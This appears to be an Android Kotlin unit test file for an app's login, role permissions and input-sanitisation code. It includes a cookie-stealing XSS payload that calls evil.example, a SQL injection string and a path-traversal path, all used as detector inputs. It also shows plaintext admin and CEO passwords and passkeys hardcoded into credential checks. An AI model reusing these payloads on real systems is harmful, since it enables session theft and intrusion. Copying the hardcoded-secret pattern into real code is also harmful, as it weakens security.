package com.example

import android.content.Context
import android.net.Uri
import androidx.test.core.app.ApplicationProvider
import com.example.data.auth.AuthCredentialsConfig
import com.example.data.auth.SecurityPermission
import com.example.data.auth.UserRole
import com.example.data.auth.UserSessionManager
import com.example.data.security.SecurityHardeningEngine
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

@RunWith(RobolectricTestRunner::class)
@Config(sdk = [36])
class UserAuthTest {

    @Test
    fun testStandardAuthorizedAppIdsList() {
        val allowed = AuthCredentialsConfig.STANDARD_AUTHORIZED_APP_IDS
        assertEquals(14, allowed.size)

        // 14 Permitted Apps for Standard Users (including rizwan_rr and maya_os)
        assertTrue(allowed.contains("rexlify"))
        assertTrue(allowed.contains("sifra"))
        assertTrue(allowed.contains("neurax"))
        assertTrue(allowed.contains("noorax"))
        assertTrue(allowed.contains("rodp"))
        assertTrue(allowed.contains("google_maps"))
        assertTrue(allowed.contains("ph_veg"))
        assertTrue(allowed.contains("google_tasks"))
        assertTrue(allowed.contains("rexlify_music"))
        assertTrue(allowed.contains("youtube"))
        assertTrue(allowed.contains("google_search"))
        assertTrue(allowed.contains("ms_edge"))
        assertTrue(allowed.contains("rizwan_rr"))
        assertTrue(allowed.contains("maya_os"))
    }

    @Test
    fun testRoleBasedAuthorizationAndRbacMatrix() {
        // 1. Standard User
        assertTrue(AuthCredentialsConfig.isAppAuthorizedForRole("rexlify", UserRole.STANDARD))
        assertTrue(AuthCredentialsConfig.isAppAuthorizedForRole("ms_edge", UserRole.STANDARD))
        assertTrue(AuthCredentialsConfig.isAppAuthorizedForRole("maya_os", UserRole.STANDARD))
        assertFalse(AuthCredentialsConfig.isAppAuthorizedForRole("claude_ai", UserRole.STANDARD))
        assertFalse(AuthCredentialsConfig.isAppAuthorizedForRole("deepseek", UserRole.STANDARD))
        assertFalse(SecurityHardeningEngine.hasPermission(UserRole.STANDARD, SecurityPermission.VIEW_SECURITY_MONITORING_CENTER))
        assertFalse(SecurityHardeningEngine.hasPermission(UserRole.STANDARD, SecurityPermission.MANAGE_USERS_AND_ROLES))

        // 2. Branch/Department Admin
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.BRANCH_ADMIN, SecurityPermission.VIEW_BRANCH_TICKETS_AND_USERS))
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.BRANCH_ADMIN, SecurityPermission.LAUNCH_ECOSYSTEM_PRO_APPS))
        assertFalse(SecurityHardeningEngine.hasPermission(UserRole.BRANCH_ADMIN, SecurityPermission.MANAGE_USERS_AND_ROLES))

        // 3. RRR Family
        assertTrue(AuthCredentialsConfig.isAppAuthorizedForRole("claude_ai", UserRole.RRR_FAMILY))
        assertTrue(AuthCredentialsConfig.isAppAuthorizedForRole("maya_os", UserRole.RRR_FAMILY))
        assertFalse(SecurityHardeningEngine.hasPermission(UserRole.RRR_FAMILY, SecurityPermission.EXECUTE_THREAT_RESPONSE_AND_UNBLOCK))

        // 4. CEO/Admin & 5. Security Administrator
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.CEO_PANEL, SecurityPermission.VIEW_SECURITY_MONITORING_CENTER))
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.CEO_PANEL, SecurityPermission.MANAGE_USERS_AND_ROLES))
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.SECURITY_ADMIN, SecurityPermission.VIEW_SECURITY_MONITORING_CENTER))
        assertTrue(SecurityHardeningEngine.hasPermission(UserRole.SECURITY_ADMIN, SecurityPermission.EXECUTE_THREAT_RESPONSE_AND_UNBLOCK))
    }

    @Test
    fun testSaltedPbkdf2ConstantTimeCredentialVerification() {
        // Family credentials (both original and admin/Rexlify)
        assertTrue(AuthCredentialsConfig.isValidFamilyCredentials("RRR@105", "RRR@0012352"))
        assertTrue(AuthCredentialsConfig.isValidFamilyCredentials("admin", "Rexlify"))
        assertTrue(AuthCredentialsConfig.isValidFamilyCredentials("Admin", "Rexlify"))
        assertFalse(AuthCredentialsConfig.isValidFamilyCredentials("admin", "WrongPass"))
        assertFalse(AuthCredentialsConfig.isValidFamilyCredentials("RRR@105", "WrongPass123"))

        // CEO Panel credentials (ID: RRR@105, Password: RRR@0012352)
        assertTrue(AuthCredentialsConfig.isValidCeoCredentials("RRR@105", "RRR@0012352"))
        assertFalse(AuthCredentialsConfig.isValidCeoCredentials("RRR@105", "RTX@0012352"))
        assertFalse(AuthCredentialsConfig.isValidCeoCredentials("admin", "Rexlify"))

        // Admin Gate password (RTX@0012352)
        assertTrue(AuthCredentialsConfig.isValidAdminGatePassword("RTX@0012352"))
        assertFalse(AuthCredentialsConfig.isValidAdminGatePassword("RRR@0012352"))
        assertFalse(AuthCredentialsConfig.isValidAdminGatePassword("RTX@0000000"))
        assertFalse(AuthCredentialsConfig.isValidAdminGatePassword(""))

        // Admin 2FA Passkeys (RRR@123, RTECH, Ruma, RRR@007)
        assertTrue(AuthCredentialsConfig.isValidAdminPasskey("RRR@123"))
        assertTrue(AuthCredentialsConfig.isValidAdminPasskey("RTECH"))
        assertTrue(AuthCredentialsConfig.isValidAdminPasskey("Ruma"))
        assertTrue(AuthCredentialsConfig.isValidAdminPasskey("RRR@007"))
        assertFalse(AuthCredentialsConfig.isValidAdminPasskey("WrongPasskey"))
        assertFalse(AuthCredentialsConfig.isValidAdminPasskey(""))
    }

    @Test
    fun testUserSessionManagerStandardLoginAndSessionCorrelation() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val sessionManager = UserSessionManager(context)
        sessionManager.logout()

        assertFalse(sessionManager.isLoggedIn())

        val session1 = sessionManager.loginStandard("Alice")
        assertTrue(sessionManager.isLoggedIn())
        assertEquals("Alice", session1.userName)
        assertEquals(UserRole.STANDARD, session1.role)
        assertTrue(session1.userId.startsWith("usr_"))
        assertTrue(session1.sessionCorrelationId.startsWith("corr_"))
        assertFalse(session1.isExpired())
        assertFalse(session1.isRevoked)

        // Duplicate name registration must create a unique new UUID and correlation ID
        sessionManager.logout()
        val session2 = sessionManager.loginStandard("Alice")
        assertEquals("Alice", session2.userName)
        assertNotEquals(session1.userId, session2.userId)
        assertNotEquals(session1.sessionCorrelationId, session2.sessionCorrelationId)
    }

    @Test
    fun testFailedAttemptLockoutProgressionWithoutPermanentDoS() {
        val context = ApplicationProvider.getApplicationContext<Context>()
        val sessionManager = UserSessionManager(context)
        sessionManager.resetFailedAttempts()

        // 1st, 2nd, 3rd failed attempts -> no lockout
        assertEquals(0L, sessionManager.recordFailedAttempt())
        assertEquals(0L, sessionManager.recordFailedAttempt())
        assertEquals(0L, sessionManager.recordFailedAttempt())

        // 4th & 5th failed attempts (>3) -> 15s lockout
        assertEquals(15_000L, sessionManager.recordFailedAttempt())
        assertEquals(15_000L, sessionManager.recordFailedAttempt())

        // 6th & 7th failed attempts (>5) -> 30s lockout
        assertEquals(30_000L, sessionManager.recordFailedAttempt())
        assertEquals(30_000L, sessionManager.recordFailedAttempt())

        // 8th failed attempt (>7) -> 5m (300_000ms) temporary cooldown (not a 24h permanent DoS lockout)
        assertEquals(UserSessionManager.LOCKOUT_TIER_3_MS, sessionManager.recordFailedAttempt())

        // Recovery path resets immediately
        sessionManager.resetFailedAttempts()
        assertEquals(0, sessionManager.getFailedAttempts())
        assertEquals(0L, sessionManager.getRemainingLockoutMillis())
    }

    @Test
    fun testSqliXssAndPathTraversalDetectionAndSanitization() {
        // SQLi payload
        val sqli = SecurityHardeningEngine.validateAndSanitizeInput(
            fieldName = "ticket.subject",
            rawInput = "Hello ' OR '1'='1 UNION SELECT * FROM registered_users"
        )
        assertFalse(sqli.isSafe)
        assertEquals("INJECTION_XSS_SQLI", sqli.detectedCategory)
        assertEquals("SEC_ERR_422_SQLI_DETECTED", sqli.errorCode)

        // XSS payload
        val xss = SecurityHardeningEngine.validateAndSanitizeInput(
            fieldName = "note.content",
            rawInput = "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
        )
        assertFalse(xss.isSafe)
        assertEquals("INJECTION_XSS_SQLI", xss.detectedCategory)
        assertEquals("SEC_ERR_422_XSS_DETECTED", xss.errorCode)
        assertFalse(xss.sanitizedValue.contains("<script>"))

        // Path traversal payload
        val traversal = SecurityHardeningEngine.validateAndSanitizeInput(
            fieldName = "upload.path",
            rawInput = "../../data/data/com.example/shared_prefs/maya_connect_user_session.xml"
        )
        assertFalse(traversal.isSafe)
        assertEquals("INJECTION_XSS_SQLI", traversal.detectedCategory)
        assertEquals("SEC_ERR_422_PATH_TRAVERSAL", traversal.errorCode)

        // Legitimate user input
        val clean = SecurityHardeningEngine.validateAndSanitizeInput(
            fieldName = "note.title",
            rawInput = "Meeting notes with REXLIFY team at 10:30 AM"
        )
        assertTrue(clean.isSafe)
        assertEquals("Meeting notes with REXLIFY team at 10:30 AM", clean.sanitizedValue)
    }

    @Test
    fun testWebViewUrlAndFileUploadValidation() {
        // Blocked schemes
        assertFalse(SecurityHardeningEngine.validateWebViewNavigationUrl("javascript:alert(1)").isAllowedInWebView)
        assertFalse(SecurityHardeningEngine.validateWebViewNavigationUrl("file:///etc/hosts").isAllowedInWebView)
        assertFalse(SecurityHardeningEngine.validateWebViewNavigationUrl("http://insecure.example.com/login").isAllowedInWebView)

        // Allowed HTTPS URLs
        assertTrue(SecurityHardeningEngine.validateWebViewNavigationUrl("https://www.rexlify.com").isAllowedInWebView)
        assertTrue(SecurityHardeningEngine.validateWebViewNavigationUrl("https://www.google.com/search?q=rexlify").isAllowedInWebView)

        // File upload validation
        assertFalse(
            SecurityHardeningEngine.validateSelectedFileUri(
                Uri.parse("content://media/external/file/payload.apk"),
                "payload.apk"
            ).isSafe
        )
        assertFalse(
            SecurityHardeningEngine.validateSelectedFileUri(
                Uri.parse("content://media/external/file/shell.sh"),
                "shell.sh"
            ).isSafe
        )
        assertTrue(
            SecurityHardeningEngine.validateSelectedFileUri(
                Uri.parse("content://media/external/images/media/1024"),
                "photo_1024.jpg"
            ).isSafe
        )
    }

    @Test
    fun testRateLimiterAndEmergencyUnblock() {
        SecurityHardeningEngine.unlockAllRateLimits()
        val endpoint = "/test/rate-limit-endpoint"
        for (i in 1..5) {
            val res = SecurityHardeningEngine.checkAndRecordRequest(endpoint, maxRequestsPerWindow = 5, windowMs = 60_000L)
            assertTrue(res.allowed)
        }
        // 6th request exceeds window -> throttled
        val blocked = SecurityHardeningEngine.checkAndRecordRequest(endpoint, maxRequestsPerWindow = 5, windowMs = 60_000L)
        assertFalse(blocked.allowed)
        assertTrue(blocked.remainingLockoutMs > 0L)

        // Admin recovery unblocks immediately
        SecurityHardeningEngine.unlockAllRateLimits()
        val afterUnblock = SecurityHardeningEngine.checkAndRecordRequest(endpoint, maxRequestsPerWindow = 5, windowMs = 60_000L)
        assertTrue(afterUnblock.allowed)
    }
}
